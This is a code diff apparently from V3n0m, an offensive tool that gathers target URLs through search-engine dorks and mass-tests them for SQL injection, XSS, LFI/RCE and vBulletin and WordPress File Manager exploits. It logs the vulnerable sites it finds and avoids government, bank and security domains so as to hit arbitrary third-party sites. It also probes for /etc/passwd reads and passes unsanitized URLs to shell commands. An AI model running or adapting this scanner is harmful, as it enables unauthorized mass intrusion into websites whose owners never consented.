-                        sqli_confirmed.write("\n" + hold_the_door)
-                    if str("Microsoft JET Database") in hits:
-                        print(hold_the_door + " is Vulnerable --> MS-Access_JETdb")
-                        sqli_confirmed.write("\n" + hold_the_door)
-                    if str("Error Occurred While Processing Request") in hits:
-                        print(hold_the_door + " is Vulnerable --> Processing Request")
-                        sqli_confirmed.write("\n" + hold_the_door)
-                    if str("Microsoft JET Database") in hits:
-                        print(hold_the_door + " is Vulnerable --> MS-Access JetDb")
-                        sqli_confirmed.write("\n" + hold_the_door)
-                    if str("Error Occurred While Processing Request") in hits:
-                        print(hold_the_door + " is Vulnerable --> Processing Request ")
-                        sqli_confirmed.write("\n" + hold_the_door)
-                    if str("Server Error") in hits:
-                        print(hold_the_door + " is Vulnerable --> Server Error")
-                        sqli_confirmed.write("\n" + hold_the_door)
-                    if str("ODBC Drivers error") in hits:
-                        print(hold_the_door + " is Vulnerable --> ODBC Drivers error")
-                        sqli_confirmed.write("\n" + hold_the_door)
-                    if str("Invalid Querystring") in hits:
-                        print(hold_the_door + " is Vulnerable --> Invalid Querystring")
-                        sqli_confirmed.write("\n" + hold_the_door)
-                    if str("OLE DB Provider for ODBC") in hits:
-                        print(hold_the_door + " is Vulnerable --> OLE DB Provider for ODBC")
-                        sqli_confirmed.write("\n" + hold_the_door)
-                    if str("VBScript Runtime") in hits:
-                        print(hold_the_door + " is Vulnerable --> VBScript Runtime")
-                        sqli_confirmed.write("\n" + hold_the_door)
-                    if str("ADODB.Field") in hits:
-                        print(hold_the_door + " is Vulnerable --> ADODB.Field")
-                        sqli_confirmed.write("\n" + hold_the_door)
-                    if str("BOF or EOF") in hits:
-                        print(hold_the_door + " is Vulnerable --> BOF or EOF")
-                        sqli_confirmed.write("\n" + hold_the_door)
-                    if str("ADODB.Command") in hits:
-                        print(hold_the_door + " is Vulnerable --> ADODB.Command")
-                        sqli_confirmed.write("\n" + hold_the_door)
-                    if str("JET Database") in hits:
-                        print(hold_the_door + " is Vulnerable --> JET Database")
-                        sqli_confirmed.write("\n" + hold_the_door)
-                    if str("mysql_fetch_array") in hits:
-                        print(hold_the_door + " is Vulnerabe --> mysql_fetch_array")
-                        sqli_confirmed.write("\n" + hold_the_door)
-                    if str("Syntax error") in hits:
-                        print(hold_the_door + " is Vulnerable --> Syntax error")
-                        sqli_confirmed.write("\n" + hold_the_door)
-                    if str("mysql_numrows()") in hits:
-                        print(hold_the_door + " is Vulnerable --> mysql_numrows()")
-                        sqli_confirmed.write("\n" + hold_the_door)
-                    if str("GetArray()") in hits:
-                        print(hold_the_door + " is Vulnerable --> GetArray()")
-                        sqli_confirmed.write("\n" + hold_the_door)
-                    if str("FetchRow()") in hits:
-                        print(hold_the_door + " is Vulnerable --> FetchRow()")
-                        sqli_confirmed.write("\n" + hold_the_door)
-                    if str("Input string was not in a correct format") in hits:
-                        print(hold_the_door + " is Vulnerable --> Input String Error")
-                        sqli_confirmed.write("\n" + hold_the_door)
-                    else:
-                        pass
-        except FileNotFoundError or Exception as verb:
-            print("Target file not found!")
-            print(str(verb))
-            time.sleep(2)
-            fmenu()
-
+    vb = len(usearch) / int(numthreads)
+    i = int(vb)
+    m = len(usearch) % int(numthreads)
+    z = 0
+    print(B + "\n[+] Preparing for SQLi scanning ...")
+    print("[+] Can take a while and appear not to be doing anything...")
+    print("[!] Please be patient if you can see this message, its Working ...\n")
+    try:
+        if len(threads) <= int(numthreads):
+            for x in range(0, int(numthreads)):
+                sliced = usearch[x * i:(x + 1) * i]
+                if z < m:
+                    sliced.append(usearch[int(numthreads) * i + z])
+                    z += 1
+                thread = Injthread(sliced)
+                thread.start()
+                threads.append(thread)
+            for thread in threads:
+                thread.join()
+    except TimeoutError:
+        pass
 
 
 # noinspection PyBroadException
@@ -1000,7 +889,7 @@ def fscan():
     print(W)
     sites = input(
         "\nChoose your target(domain) ie .com , to attempt to force the domain restriction use *, ie *.com : ")
-    sitearray = list(map(str,sites.split(',')))
+    sitearray = list(map(str, sites.split(',')))
     dorks = input("Choose the number of random dorks (0 for all.. may take awhile!)   : ")
     print("")
     if int(dorks) == 0:
@@ -1069,17 +958,18 @@ def vulnscan():
     global lfi_log_file
     global rce_log_file
     global xss_log_file
-    global slq_log_file
+    global sql_log_file
     global misc_log_file
     global vuln
     misc_log_file = open("v3n0m-misc.txt", "a", encoding='utf-8')
     lfi_log_file = open("v3n0m-lfi.txt", "a", encoding='utf-8')
     rce_log_file = open("v3n0m-rce.txt", "a", encoding='utf-8')
     xss_log_file = open("v3n0m-xss.txt", "a", encoding='utf-8')
-    sql_log_file = open("sql.txt", "a",encoding='utf-8')
+    sql_log_file = open("v3n0m-sql.txt", "a", encoding='utf-8')
     endsub = 0
     print(R + "\n[1] SQLi Testing, " + O + "Will verify the Vuln links and print the Injectable URL to the screen")
-    print(R + "[2] SQLi Testing Auto Mode " + O + "Will attempt to Verify vuln sites then Column count if MySQL detected")
+    print(
+        R + "[2] SQLi Testing Auto Mode " + O + "Will attempt to Verify vuln sites then Column count if MySQL detected")
     print(R + "[3] XSS Testing")
     print(R + "[4] LFI/RCE Testing")
     print(R + "[5] Save valid Sorted and confirmed vuln urls to file")
@@ -1102,22 +992,23 @@ def vulnscan():
         vuln = []
         injtest()
         colfinder()
-        endsub = 0
         print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(vuln)) + B + " vuln sites found.")
         print()
+        vulnscan()
     elif chce == '3':
         os.system('clear')
         vuln = []
         xsstest()
         print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(vuln)) + B + " vuln sites found.")
         print()
-        endsub = 0
+        vulnscan()
     elif chce == '4':
         vuln = []
         lfitest()
         endsub = 0
         print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(vuln)) + B + " vuln sites found.")
         print()
+        vulnscan()
     elif chce == '5':
         print(B + "\nSaving valid urls (" + str(len(finallist)) + ") to file")
         listname = input("Filename: ").encode('utf-8')
@@ -1127,7 +1018,7 @@ def vulnscan():
             list_name.write(t + "\n")
         list_name.close()
         print("Urls saved, please check", listname)
-        endsub = 0
+        vulnscan()
     elif chce == '6':
         print(W + "\nPrinting Unsorted urls:\n")
         unsorted.sort()
@@ -1137,32 +1028,51 @@ def vulnscan():
     elif chce == '7':
         print(B + "\nVuln found ", len(vuln))
         print(vuln)
-        endsub = 0
     elif chce == '8':
         print(W + "\nPrinting Sorted urls:\n")
         finallist.sort()
         for t in finallist:
             print(B + t)
     elif chce == '9':
-         current = os.getcwd()
-         os.chdir(current + '/modules/xss-strike')
-         for url in finallist:
-             print("Testing:" + url)
-             xss = subprocess.Popen("python xsstrike.py -u " + url , shell=True)
-             xss.communicate()
+        current = os.getcwd()
+        os.chdir(current + '/modules/xss-strike')
+        for url in finallist:
+            print("Testing:" + url)
+            xss = subprocess.Popen("python xsstrike.py -u " + url, shell=True)
+            xss.communicate()
     elif chce == '10':
         vuln = []
-        injtest()
-        print(B + "SQLI Scan Complete Going To XSS Now")
-        print()
-        xsstest()
-        print(B + "XSS Scan Complete Going To LFI Now")
-        lfitest()
-        print( B + "LFI Scan Complete Going To Vbulletin 5.6.X")
-        vb56test()
-        print( B + "Vbulletin Scan Complete Going To WordPress FileManager")
-        wpfmtest()
-        print(B + "All Scans Complete")
+        print("\n[+] Preparing for SQLI scanning ...")
+        print("[+] Can take a while and appear not to be doing anything...")
+        print("[!] Please be patient if you can see this message, its Working ...\n")
+        for url in finallist:
+            classicinj(url)
+        print("\n[+] Preparing for Vbulletin 5.6.x scanning ...")
+        print("[+] Can take a while and appear not to be doing anything...")
+        print("[!] Please be patient if you can see this message, its Working ...\n")
+        for url in finallist:
+            classicvb56(url)
+        print("\n[+] Preparing for WordPress File Manager scanning ...")
+        print("[+] Can take a while and appear not to be doing anything...")
+        print("[!] Please be patient if you can see this message, its Working ...\n")
+        for url in finallist:
+            classicwpfm(url)
+        print("\n[+] Preparing for Vbulletin 5.x scanning ...")
+        print("[+] Can take a while and appear not to be doing anything...")
+        print("[!] Please be patient if you can see this message, its Working ...\n")
+        for url in finallist:
+            vb5classic(url)
+        print("\n[+] Preparing for LFI > RCE  scanning...")
+        print("[+] Can take a while and appear not to be doing anything...")
+        print("[!] Please be patient if you can see this message, its Working ...\n")
+        for url in finallist:
+            classiclfi(url)
+        print("\n[+] Preparing for XSS scanning ...")
+        print("[+] Can take a while and appear not to be doing anything...")
+        print("[!] Please be patient if you can see this message, its Working ...\n")
+        for url in finallist:
+            classicxss(url)
+
         print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(col)) + B + " vuln sites found.")
     elif chce == '11':
         endsub = 1
@@ -1170,14 +1080,19 @@ def vulnscan():
     elif chce == '12':
         print("[1] Vbulletin 5.6.x > 5.6.2")
         print("[2] WordPress File-Manager")
+        print("[3] Vbulletin 5.x > 5.5.x")
         vulnchoice = input("Enter Choice")
         if vulnchoice == '1':
             vuln = []
             vb56test()
             print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(col)) + B + " vuln sites found.")
         if vulnchoice == '2':
+            vuln = []
             wpfmtest()
             print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(col)) + B + " vuln sites found.")
+        if vulnchoice == '3':
+            vuln = []
+            vb5test()
 
     else:
         fmenu()
@@ -1195,7 +1110,6 @@ def ignoringGet(url):
         return responce.text
     except Exception as verb:
         print(str(verb))
-
 
 
 def CreateTempFolder(self):
@@ -1222,9 +1136,10 @@ def download(url, file, progressBar=None):
 
 
 def unzip(file):
-    with zipfile.ZipFile(file+'', 'w') as myzip:
+    with zipfile.ZipFile(file + '', 'w') as myzip:
         myzip.write(file)
-    os.remove(file+'')
+    os.remove(file + '')
+
 
 downloads = [
     ['https://www.cloudflare.com/ips-v4', 'ips-v4', progressBar],
@@ -1232,8 +1147,6 @@ downloads = [
     ['http://crimeflare.net:82/domains/ipout.zip', 'ipout.zip',
      progressBar]
 ]
-
-
 
 
 # noinspection PyBroadException
@@ -1305,7 +1218,8 @@ async def search(pages_pulled_as_one):
             host = url.split("/", 3)
             domain = host[2]
             for site in sitearray:
-                if domain not in tmplist and "=" in url and any(x in url for x in sitearray) and 'gov' not in url and 'edu' not in url and 'fbi' not in url and 'cia' not in url and 'pentest' not in url and 'github' not in url and 'wordpress' not in url and 'askjeeves' not in url and 'hackforums' not in url and 'twitter' not in url and 'facebook' not in url and 'phpfreaks' not in url and 'codingforums' not in url and 'phpbuilder' not in url and 'iranhack' not in url and 'phpbuddy' not in url and 'youtube' not in url and 'google' not in url and 'msdn' not in url and 'hack' not in url and 'school' not in url and 'bank' not in url and 'd0rks' not in url and 'yahoo' not in url and 'mossad' not in url and 'nsa' not in url and 'emergency' not in url and 'foundation' not in url and 'learning' not in url and 'school' not in url and 'charity' not in url and 'pastebin' not in url and 'iranhackers' not in url and 'evilzone' not in url and 'venom' not in url and 'v3n0m' not in url and '24img' not in url and 'microsoft' not in url and 'stackoverflow' not in url and 'javascript' not in url:
+                if domain not in tmplist and "=" in url and any(x in url for x in
+                                                                sitearray) and 'gov' not in url and 'edu' not in url and 'fbi' not in url and 'cia' not in url and 'pentest' not in url and 'github' not in url and 'wordpress' not in url and 'askjeeves' not in url and 'hackforums' not in url and 'twitter' not in url and 'facebook' not in url and 'phpfreaks' not in url and 'codingforums' not in url and 'phpbuilder' not in url and 'iranhack' not in url and 'phpbuddy' not in url and 'youtube' not in url and 'google' not in url and 'msdn' not in url and 'hack' not in url and 'school' not in url and 'bank' not in url and 'd0rks' not in url and 'yahoo' not in url and 'mossad' not in url and 'nsa' not in url and 'emergency' not in url and 'foundation' not in url and 'learning' not in url and 'school' not in url and 'charity' not in url and 'pastebin' not in url and 'iranhackers' not in url and 'evilzone' not in url and 'venom' not in url and 'v3n0m' not in url and '24img' not in url and 'microsoft' not in url and 'stackoverflow' not in url and 'javascript' not in url:
                     finallist.append(url)
                     tmplist.append(domain)
         except KeyboardInterrupt:
@@ -1332,7 +1246,6 @@ async def search(pages_pulled_as_one):
 # noinspection PyBroadException
 def fmenu():
     import time
-    global customSelected
     global vuln
     global customlist
     vuln = []
@@ -1358,8 +1271,9 @@ def fmenu():
         afsite = input("Enter the site eg target.com: ")
         print(B)
         pwd = os.path.dirname(str(os.path.realpath(__file__)))
-        findadmin = subprocess.Popen('python3 ' + pwd + "/modules/adminfinder.py -w lists/adminlist.txt -u " + str(afsite),
-                                     shell=True)
+        findadmin = subprocess.Popen(
+            'python3 ' + pwd + "/modules/adminfinder.py -w lists/adminlist.txt -u " + str(afsite),
+            shell=True)
         findadmin.communicate()
         subprocess._cleanup()
 
@@ -1370,7 +1284,8 @@ def fmenu():
     elif chce == '4':
         target_site = input("Enter the site eg target.com: ")
         print("[1] Normal Scan suitable for average sites")
-        print("[2] Scan All The Things, if its on the internet, we'll find it... Go cook a cake, this will take a LONG time")
+        print(
+            "[2] Scan All The Things, if its on the internet, we'll find it... Go cook a cake, this will take a LONG time")
         allthethings = input(":")
         att = ""
         if allthethings == '1':
@@ -1398,11 +1313,11 @@ def fmenu():
         cloud()
         fmenu()
     elif chce == '7':
-         current = os.getcwd()
-         os.chdir(current + '/modules/xss-strike')
-         xss = subprocess.Popen("python V3n0mWrapper.py", shell=True)
-         xss.communicate()
-        
+        current = os.getcwd()
+        os.chdir(current + '/modules/xss-strike')
+        xss = subprocess.Popen("python V3n0mWrapper.py", shell=True)
+        xss.communicate()
+
 
     elif chce == '8':
         print(W + "")
@@ -1417,12 +1332,14 @@ def fmenu():
         print("[7] Skip to custom XSS list checking")
         print("[8] FTP Crawler")
         print("[9] Skip to custom target list")
+        print("[10]Skip To custom LFI List checking")
         print("[0] Return to main menu")
         chce2 = input(":")
         if chce2 == '1':
-            os.system('clear')
-            customSelected = True
-            injtest()
+            sqllist = input('Enter list ')
+            sqllist = [line.strip() for line in open(sqllist, 'r', encoding='utf-8')]
+            for url in sqllist:
+                classicinj(url)
         elif chce2 == '2':
             lfisuite = subprocess.Popen('python '  "lfisuite.py ", shell=True)
             lfisuite.communicate()
@@ -1446,7 +1363,8 @@ def fmenu():
             import time
             euid = os.geteuid()
             if euid == 0:
-                print("You Cannot perform any upgrades or repairs while logged in with root permissions, please restart v3n0m.")
+                print(
+                    "You Cannot perform any upgrades or repairs while logged in with root permissions, please restart v3n0m.")
                 time.sleep(6)
                 killpid()
             import pip
@@ -1479,15 +1397,15 @@ def fmenu():
             xsslist = [line.strip() for line in open(xsslist, 'r', encoding='utf-8')]
             for url in xsslist:
                 classicxss(url)
-                
+
         elif chce2 == '8':
             randomip = input("How many IP addresses do you want to scan: ")
             current_dir = os.getcwd()
             os.chdir(current_dir + '/modules')
             ftpcrawl = subprocess.Popen("ftpcrawler.py -i " + randomip, shell=True)
             ftpcrawl.communicate()
-            
-        elif chce2 =='9':
+
+        elif chce2 == '9':
             import target
         elif chce2 == '10':
             vuln = []
@@ -1496,7 +1414,7 @@ def fmenu():
             for url in lfilist:
                 classiclfi(url)
 
-            
+
 d0rk = [line.strip() for line in open("lists/d0rks", 'r', encoding='utf-8')]
 header = [line.strip() for line in open("lists/header", 'r', encoding='utf-8')]
 xsses = [line.strip() for line in open("lists/xsses", 'r', encoding='utf-8')]
@@ -1512,7 +1430,7 @@ search_ignore = ['gov', 'fbi', 'javascript', 'stackoverflow',
                  'hack', 'msdn', 'google', 'youtube', 'phpbuddy', 'iranhack',
                  'phpbuilder', 'codingforums', 'phpfreaks', 'facebook', 'twitter',
                  'hackforums', 'askjeeves', 'wordpress', 'github', 'pentest']
-                 
+
 random.shuffle(header)
 random.shuffle(lfis)
 
@@ -1621,6 +1539,37 @@ def lfi_list_counter():
     except FileNotFoundError:
         lfi_count = 0
 
+
+def xss_list_counter():
+    global xss_count
+    try:
+        f = open("v3n0m-xss.txt", encoding='utf-8')
+        l = [x for x in f.readlines() if x != "\n"]
+        xss_count = (len(l))
+    except FileNotFoundError:
+        xss_count = 0
+
+
+def misc_list_counter():
+    global misc_count
+    try:
+        f = open("v3n0m-misc.txt", encoding='utf-8')
+        l = [x for x in f.readlines() if x != "\n"]
+        misc_count = (len(l))
+    except FileNotFoundError:
+        misc_count = 0
+
+
+def rce_list_counter():
+    global rce_count
+    try:
+        f = open("v3n0m-rce.txt", encoding='utf-8')
+        l = [x for x in f.readlines() if x != "\n"]
+        rce_count = (len(l))
+    except FileNotFoundError:
+        rce_count = 0
+
+
 list_count = 0
 lfi_count = 0
 subprocess.call("clear", shell=True)
@@ -1632,7 +1581,7 @@ gets = 0
 file = "/etc/passwd"
 ProxyEnabled = False
 menu = True
-current_version = str("430  ")
+current_version = str("431  ")
 while True:
     fmenu()
 
